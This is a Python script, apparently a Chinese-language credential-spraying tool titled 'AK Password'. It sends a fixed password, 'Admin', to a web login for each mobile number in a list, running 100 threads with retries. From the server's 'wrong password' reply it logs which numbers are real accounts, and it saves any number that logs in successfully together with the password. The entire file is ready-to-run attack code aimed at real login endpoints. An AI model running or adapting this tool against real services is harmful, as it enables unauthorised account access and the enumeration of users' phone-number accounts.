import requests
from concurrent.futures import ThreadPoolExecutor
import time
from colorama import Fore, Back, Style

target_url = ""  # URL
username_dict = ""  # USER字典
password = "Admin"  # 固定密码
result_file = "TrueUser.txt"  # 筛选出来的结果保存在这里
max_workers = 100
max_retries = 5
retry_delay = 5

# ANSI颜色码
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
ENDC = Style.RESET_ALL

# 背景颜色
BG_COLOR = {
    RED: Back.RED,
    BLUE: Back.BLUE,
    GREEN: Back.GREEN
}


def save_true_user(username):
    with open(result_file, "a") as file:
        file.write(username + "\n")


def write_timestamp():
    timestamp = f"TimeSleep(5 min) -- {time.strftime('%Y-%m-%d %H:%M:%S')} -- AK\n"
    with open(result_file, "a") as file:
        file.write(timestamp)


def hydra_brute_force(username):
    session = requests.Session()
    payload = {
        "mobile": username,
        "password": password,
        "data_type": "mobile"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Referer": "",
        # 添加其他必要的请求头信息
    }

    retries = 0
    while retries < max_retries:
        try:
            response = session.post(target_url, data=payload, headers=headers)
            if response.status_code == 200:
                json_data = response.json()
                if "message" in json_data and json_data["message"] == "\u5bc6\u7801\u9519\u8bef":
                    save_true_user(username)
                    print(
                        f"\n{RED}|{ENDC}\n{RED}|____________{username} {ENDC}", end="", flush=True)
                    print(f"{BG_COLOR[RED]}__{ENDC}", end="", flush=True)
                elif "status" in json_data and json_data["status"] == 1:
                    save_true_user(username + " " + password)
                    print(
                        f"\n{BLUE}|{ENDC}\n{BLUE}|__|__|__________{username} {password}{ENDC}", end="", flush=True)
                    print(f"{BG_COLOR[BLUE]}__{ENDC}", end="", flush=True)
                return
        except requests.exceptions.ConnectionError:
            print(f"\nError occurred for username: {RED}{username}{ENDC}")
            print("Connection error occurred. Retrying...")
            retries += 1
            time.sleep(retry_delay)

    print(
        f"\nMax retries exceeded for username: {BLUE}{username}{ENDC}. Skipping...")
    print(f"{GREEN}\n|{ENDC}", end="", flush=True)


def process_username(username):
    hydra_brute_force(username)


# 横幅字符
banner = r"""
   _____   ____  __.  ._.  __________                                               .___
  /  _  \ |    |/ _|  | |  \______   \_____    ______ ________  _  _____________  __| _/
 /  /_\  \|      <    |_|   |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
/    |    \    |  \   |-|   |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
\____|__  /____|__ \  | |   |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ | 
|       \/        \/  |_|                  \/     \/     \/                          \/ 
|__Ak     |__手术刀
|__7Bash  |__ICE
"""

print(f"{RED}{banner}{ENDC}")

with open(username_dict, "r") as file:
    usernames = file.read().splitlines()

with ThreadPoolExecutor(max_workers=max_workers) as executor:
    executor.map(process_username, usernames)
while True:
    print(f"{GREEN}\n|\n|{ENDC} ", end="", flush=True)
    print(f"{BG_COLOR[GREEN]}__{ENDC}", end="", flush=True)
    time.sleep(3)
    if time.time() % 300 == 0:
        write_timestamp()
